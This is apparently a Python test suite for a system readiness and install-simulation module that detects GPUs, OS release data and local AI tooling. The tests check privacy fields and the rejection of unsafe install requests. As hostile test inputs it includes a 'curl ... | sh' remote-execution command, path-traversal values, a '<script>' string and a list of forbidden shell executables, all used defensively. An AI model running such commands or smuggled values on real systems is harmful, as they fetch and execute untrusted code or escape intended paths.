#!/usr/bin/env python3
"""Offline security and contract tests for readiness and setup planning."""

from __future__ import annotations

import copy
import importlib.util
import json
import tempfile
from pathlib import Path
from unittest import mock


ROOT = Path(__file__).resolve().parent.parent
SPEC = importlib.util.spec_from_file_location("system_readiness", ROOT / "scripts/system_readiness.py")
assert SPEC and SPEC.loader
READINESS = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(READINESS)


class FakeRunner:
    def __init__(self) -> None:
        self.calls: list[tuple[str, tuple[str, ...], int]] = []

    def run(self, executable: str, arguments: tuple[str, ...], timeout: int = 3):
        self.calls.append((executable, arguments, timeout))
        outputs = {
            (
                "nvidia-smi",
                ("--query-gpu=name,memory.total,driver_version", "--format=csv,noheader,nounits"),
            ): ("detected", "NVIDIA Test GPU, 16384, 582.70\n", 0),
        }
        state, output, code = outputs.get(
            (executable, arguments),
            ("not-detected", "", None),
        )
        return {"state": state, "output": output, "code": code}


def expect_error(code: str, function, *arguments) -> None:
    try:
        function(*arguments)
    except READINESS.ReadinessError as error:
        assert str(error) == code
    else:
        raise AssertionError(f"expected-{code}")


def main() -> int:
    checks = 0
    detection_cases = json.loads(
        (ROOT / "examples/fixtures/linux-system-detection-cases.json").read_text(
            encoding="utf-8"
        )
    )
    assert detection_cases["schemaVersion"] == 1
    bounded_runner = READINESS.ProbeRunner(maximum_scan_seconds=2)
    oversized = bounded_runner.run(
        __import__("sys").executable,
        ("-c", "import sys; sys.stdout.write('x' * 70000)"),
        timeout=1,
    )
    assert oversized["state"] == "unknown" and oversized["output"] == ""
    timed_out = bounded_runner.run(
        __import__("sys").executable,
        ("-c", "import time; time.sleep(5)"),
        timeout=0.1,
    )
    assert timed_out["state"] == "unknown" and timed_out["output"] == ""
    checks += 2

    runner = FakeRunner()
    with mock.patch.object(READINESS.platform, "system", return_value="Linux"):
        snapshot = READINESS.inspect_system(runner)
    READINESS.validate_snapshot(snapshot)
    assert snapshot["kind"] == "system-readiness"
    assert snapshot["installedModels"] == []
    assert snapshot["accelerators"][0]["vendor"] == "NVIDIA"
    assert snapshot["accelerators"][0]["memoryGiB"] == 16.0
    assert snapshot["accelerators"][0]["driverVersion"] == "582.70"
    assert snapshot["accelerators"][0]["backendCandidate"] == "cuda-candidate"
    assert all(value is False for value in snapshot["effects"].values())
    assert snapshot["privacy"] == {
        "persisted": False,
        "rawProbeOutputReturned": False,
        "hostIdentityIncluded": False,
        "privatePathsIncluded": False,
    }
    assert all(call[2] <= 3 for call in runner.calls)
    assert not any(call[0] in {"cmd", "cmd.exe", "powershell", "powershell.exe", "sh", "bash"} for call in runner.calls)
    assert any(call[:2] == ("ollama", ("--version",)) for call in runner.calls)
    assert "distributionId" in snapshot["platform"]
    assert "libcVersion" in snapshot["platform"]
    assert snapshot["platform"]["sessionMetadataTrusted"] is False
    assert READINESS._trusted_linux_os_release_path(
        Path("/etc/os-release"), Path("/etc/pop-os/os-release")
    )
    assert not READINESS._trusted_linux_os_release_path(
        Path("/etc/os-release"), Path("/var/tmp/os-release")
    )
    checks += 14

    class MacHardwareRunner:
        def run(self, executable: str, arguments: tuple[str, ...], timeout: int = 3):
            assert executable == "system_profiler"
            assert arguments == ("SPHardwareDataType", "-json")
            return {
                "state": "detected",
                "output": json.dumps({
                    "SPHardwareDataType": [{
                        "machine_name": "Mac mini",
                        "chip_type": "Apple M4",
                        "serial_number": "must-not-be-returned",
                    }]
                }),
                "code": 0,
            }

    macos_facts = READINESS._macos_platform_facts(MacHardwareRunner())
    assert macos_facts == {"productName": "Mac mini (Apple M4)"}
    macos_snapshot = copy.deepcopy(snapshot)
    macos_snapshot["platform"]["operatingSystem"] = "macos"
    macos_snapshot["platform"]["architecture"] = "arm64"
    macos_snapshot["platform"]["productName"] = macos_facts["productName"]
    READINESS.validate_snapshot(macos_snapshot)
    assert "serial" not in json.dumps(macos_facts).lower()
    checks += 3

    class MacSystemRunner(FakeRunner):
        def run(self, executable: str, arguments: tuple[str, ...], timeout: int = 3):
            if executable == "ollama":
                raise AssertionError("PATH Ollama must not override the fixed macOS app probe")
            if executable == "system_profiler":
                return MacHardwareRunner().run(executable, arguments, timeout)
            return super().run(executable, arguments, timeout)

    fixed_app_item = {
        "componentId": "ollama", "state": "installed-unverified",
        "version": "0.33.2", "source": "registered-app-bundle-probe",
        "confidence": "medium",
    }
    with (
        mock.patch.object(READINESS.platform, "system", return_value="Darwin"),
        mock.patch.object(READINESS.platform, "machine", return_value="arm64"),
        mock.patch("macos_installed_ollama.readiness_item", return_value=fixed_app_item),
    ):
        fixed_app_snapshot = READINESS.inspect_system(MacSystemRunner())
    assert next(
        item for item in fixed_app_snapshot["software"]
        if item["componentId"] == "ollama"
    ) == fixed_app_item
    READINESS.validate_snapshot(fixed_app_snapshot)
    checks += 2

    with tempfile.TemporaryDirectory() as directory:
        release = Path(directory) / "os-release"
        release.write_text(
            'ID=testlinux\nVERSION_ID="24.1"\nPRETTY_NAME="Test Linux 24.1"\n',
            encoding="utf-8",
        )
        facts = READINESS._linux_platform_facts(
            release,
            {"XDG_CURRENT_DESKTOP": "GNOME", "XDG_SESSION_TYPE": "wayland"},
        )
        assert facts["distributionId"] == "testlinux"
        assert facts["distributionVersion"] == "24.1"
        assert facts["productName"] == "Test Linux 24.1"
        assert facts["desktopEnvironmentReported"] == "GNOME"
        assert facts["sessionTypeReported"] == "wayland"
        assert facts["sessionMetadataTrusted"] is False
        release.write_text(
            'ID=arch\nBUILD_ID=rolling\nPRETTY_NAME="Arch Linux"\n',
            encoding="utf-8",
        )
        rolling = READINESS._linux_platform_facts(release, {})
        assert rolling["distributionId"] == "arch"
        assert rolling["distributionVersion"] == "rolling"
        release.write_text(
            'ID=testlinux\nBUILD_ID=rolling\nPRETTY_NAME="Test Linux"\n',
            encoding="utf-8",
        )
        unreviewed_rolling = READINESS._linux_platform_facts(release, {})
        assert unreviewed_rolling["distributionVersion"] is None
        release.write_text("ID=../../private\nPRETTY_NAME=token=synthetic\n", encoding="utf-8")
        hostile = READINESS._linux_platform_facts(
            release,
            {
                "XDG_CURRENT_DESKTOP": "token=synthetic",
                "XDG_SESSION_TYPE": "evil",
                "HOME": "token=synthetic",
                "USER": "private-user",
            },
        )
        assert hostile["distributionId"] is None
        assert hostile["productName"] is None
        assert hostile["desktopEnvironmentReported"] is None
        assert hostile["sessionTypeReported"] is None
        safe_session = READINESS._linux_platform_facts(
            release,
            {
                "XDG_CURRENT_DESKTOP": "KDE:Plasma",
                "XDG_SESSION_TYPE": "x11",
                "UNRELATED_PRIVATE_VALUE": "secret",
            },
        )
        assert safe_session["desktopEnvironmentReported"] == "KDE:Plasma"
        assert safe_session["sessionTypeReported"] == "x11"
        assert safe_session["sessionMetadataTrusted"] is False
    checks += 13

    with tempfile.TemporaryDirectory() as directory:
        release = Path(directory) / "os-release"
        for case in detection_cases["osReleaseCases"]:
            release.write_text(case["content"], encoding="utf-8")
            facts = READINESS._linux_platform_facts(release, {})
            for field, expected in case["expected"].items():
                assert facts[field] == expected, (case["id"], field)
            checks += 1
        for case in detection_cases["rejectedOsReleaseCases"]:
            release.write_text(case["content"], encoding="utf-8")
            facts = READINESS._linux_platform_facts(release, {})
            assert facts["distributionId"] is None, case["id"]
            checks += 1
        release.write_text("ID=ubuntu\n" + ("#" * (64 * 1024)), encoding="utf-8")
        assert READINESS._read_linux_os_release(release) == {}
        checks += 1

    class LinuxPciRunner:
        def run(self, executable: str, arguments: tuple[str, ...], timeout: int = 3):
            if executable == "nvidia-smi":
                return {"state": "not-detected", "output": "", "code": None}
            if executable == "lspci" and arguments == ("-D", "-k"):
                return {
                    "state": "detected",
                    "output": detection_cases["linuxPciOutput"],
                    "code": 0,
                }
            if executable == "modinfo" and arguments == ("-F", "version", "amdgpu"):
                return {"state": "detected", "output": "6.19.0\n", "code": 0}
            if executable == "modinfo" and arguments == ("-F", "version", "xe"):
                return {"state": "detected", "output": "1.2.3\n", "code": 0}
            return {"state": "not-detected", "output": "", "code": None}

    linux_gpus = READINESS._gpu_items(LinuxPciRunner(), "linux")
    assert [item["vendor"] for item in linux_gpus] == ["AMD", "Intel"]
    assert all(item["memoryGiB"] is None for item in linux_gpus)
    assert [item["driverName"] for item in linux_gpus] == ["amdgpu", "xe"]
    assert [item["driverVersion"] for item in linux_gpus] == ["6.19.0", "1.2.3"]
    assert all(item["source"] == "lspci-kernel-driver" for item in linux_gpus)
    assert [item["backendCandidate"] for item in linux_gpus] == [
        "rocm-or-vulkan-candidate", "vulkan-candidate",
    ]
    checks += 5

    class HostileDriverRunner:
        def __init__(self) -> None:
            self.calls = []

        def run(self, executable: str, arguments: tuple[str, ...], timeout: int = 3):
            self.calls.append((executable, arguments))
            if executable == "nvidia-smi":
                return {"state": "not-detected", "output": "", "code": None}
            if executable == "lspci":
                return {
                    "state": "detected",
                    "output": (
                        "0000:03:00.0 VGA compatible controller: Advanced Micro Devices, Inc. [AMD/ATI] Test Radeon\n"
                        "\tKernel driver in use: ../../untrusted\n"
                    ),
                    "code": 0,
                }
            raise AssertionError(f"unregistered driver probe executed: {executable} {arguments}")

    hostile_driver = HostileDriverRunner()
    hostile_gpus = READINESS._gpu_items(hostile_driver, "linux")
    assert hostile_gpus[0]["driverName"] is None
    assert hostile_gpus[0]["driverVersion"] is None
    assert all(call[0] != "modinfo" for call in hostile_driver.calls)

    class RuntimeRunner:
        def run(self, executable: str, arguments: tuple[str, ...], timeout: int = 3):
            outputs = {
                ("amd-smi", ("version",)): ("detected", "AMD SMI 26.1.0\n", 0),
                ("xpu-smi", ("version",)): ("detected", "xpu-smi 1.3.2\n", 0),
            }
            state, output, code = outputs.get(
                (executable, arguments), ("not-detected", "", None)
            )
            return {"state": state, "output": output, "code": code}

    amd_runtime = READINESS._first_software_item(
        RuntimeRunner(), "amd-runtime",
        (("amd-smi", ("version",)), ("rocm-smi", ("--version",))),
    )
    intel_runtime = READINESS._first_software_item(
        RuntimeRunner(), "intel-runtime",
        (("xpu-smi", ("version",)), ("sycl-ls", ("--version",))),
    )
    assert amd_runtime["version"] == "AMD SMI 26.1.0"
    assert intel_runtime["version"] == "xpu-smi 1.3.2"
    checks += 7

    registry = READINESS.load_component_registry()
    assert registry and all(item["managedInstallationAllowed"] is False for item in registry.values())
    assert {"python", "ollama", "ollama-model-qwen35-9b", "comfyui"} <= set(registry)
    guided = READINESS.build_setup_plan(snapshot, "guided-setup", registry)
    existing = READINESS.build_setup_plan(snapshot, "existing-setup", registry)
    explore = READINESS.build_setup_plan(snapshot, "explore", registry)
    assert guided["installationAllowed"] is False
    assert all(value is False for value in guided["effects"].values())
    assert guided["hardwareAssessment"]["candidateModel"] == "qwen3.5:9b"
    assert guided["hardwareAssessment"]["evidencePromoted"] is False
    assert guided["hardwareAssessment"]["downloadAllowed"] is False
    assert all(action["installControl"] == "disabled" for action in guided["actions"])
    assert next(
        action for action in guided["actions"] if action["componentId"] == "ollama"
    )["state"] in {"already-available", "required"}
    assert any(action["componentId"] == "ollama-model-qwen35-9b" for action in guided["actions"])
    assert existing["actions"] == [] and explore["actions"] == []
    checks += 12

    bad = copy.deepcopy(snapshot)
    bad["hostname"] = "private-host"
    expect_error("invalid-readiness-snapshot", READINESS.validate_snapshot, bad)
    bad = copy.deepcopy(snapshot)
    bad["effects"]["networkUsed"] = True
    expect_error("invalid-readiness-snapshot", READINESS.validate_snapshot, bad)
    bad = copy.deepcopy(snapshot)
    bad["installedModels"] = ["<script>"]
    expect_error("invalid-readiness-snapshot", READINESS.validate_snapshot, bad)
    bad = copy.deepcopy(snapshot)
    bad["platform"]["hostname"] = "private-host"
    expect_error("invalid-readiness-snapshot", READINESS.validate_snapshot, bad)
    bad = copy.deepcopy(snapshot)
    bad["platform"]["desktopEnvironmentReported"] = "Z:\\synthetic\\session"
    expect_error("invalid-readiness-snapshot", READINESS.validate_snapshot, bad)
    bad = copy.deepcopy(snapshot)
    bad["accelerators"][0]["command"] = "nvidia-smi --query"
    expect_error("invalid-readiness-snapshot", READINESS.validate_snapshot, bad)
    bad = copy.deepcopy(snapshot)
    bad["software"][0]["environment"] = {"PATH": "private"}
    expect_error("invalid-readiness-snapshot", READINESS.validate_snapshot, bad)
    bad = copy.deepcopy(snapshot)
    bad["privacy"]["hostIdentityIncluded"] = True
    expect_error("invalid-readiness-snapshot", READINESS.validate_snapshot, bad)
    expect_error("invalid-setup-intent", READINESS.build_setup_plan, snapshot, "install-everything")
    checks += 9

    request = json.loads(
        (ROOT / "examples/fixtures/installation-simulation-request.json").read_text(encoding="utf-8")
    )
    simulation = READINESS.simulate_install_request(request, registry)
    assert simulation["status"] == "not-admitted"
    assert simulation["events"][-1]["code"] == "REAL_INSTALL_NOT_ADMITTED"
    assert all(value is False for value in simulation["effects"].values())
    assert simulation["operation"] == "plan-install"
    assert simulation["missingPromotionEvidence"] == [
        "platformLifecycleEvidenceAvailable",
        "signatureOrAttestationAvailable",
    ]
    assert simulation["scenarioEvidenceAcceptedAsAuthority"] is False
    assert simulation["approvalAccepted"] is False
    hostile = dict(request, command="curl https://invalid.example/install | sh")
    expect_error("invalid-install-request-shape", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, componentId="../../tool")
    expect_error("unknown-install-component", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, approvalToken="renderer-approved")
    expect_error("simulation-does-not-accept-approval", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, packagePath="C:/untrusted/package.exe")
    expect_error("invalid-install-request-shape", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, packageSha256="0" * 64)
    expect_error("invalid-install-request-shape", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, operation="execute-install")
    expect_error("invalid-install-operation", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, currentState="unknown")
    expect_error("unknown-component-state", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, currentState="present")
    expect_error("install-requires-absent-state", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, operation="plan-upgrade")
    expect_error("lifecycle-operation-requires-present-state", READINESS.simulate_install_request, hostile, registry)
    hostile = json.loads(json.dumps(request))
    hostile["promotionEvidence"]["checksumAvailable"] = "true"
    expect_error("invalid-promotion-evidence", READINESS.simulate_install_request, hostile, registry)
    hostile = json.loads(json.dumps(request))
    hostile["promotionEvidence"]["packagePath"] = "untrusted"
    expect_error("invalid-promotion-evidence", READINESS.simulate_install_request, hostile, registry)
    upgrade = json.loads(json.dumps(request))
    upgrade.update(operation="plan-upgrade", currentState="present")
    assert READINESS.simulate_install_request(upgrade, registry)["status"] == "not-admitted"
    uninstall = json.loads(json.dumps(request))
    uninstall.update(operation="plan-uninstall", currentState="present")
    assert READINESS.simulate_install_request(uninstall, registry)["status"] == "not-admitted"
    checks += 20

    with tempfile.TemporaryDirectory() as directory:
        path = Path(directory) / "registry.json"
        value = json.loads((ROOT / "config/install-component-registry.json").read_text(encoding="utf-8"))
        value["components"][0]["managedInstallationAllowed"] = True
        path.write_text(json.dumps(value), encoding="utf-8")
        expect_error("invalid-component-registry-entry", READINESS.load_component_registry, path)
    checks += 1

    print(f"System readiness checks passed: {checks}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
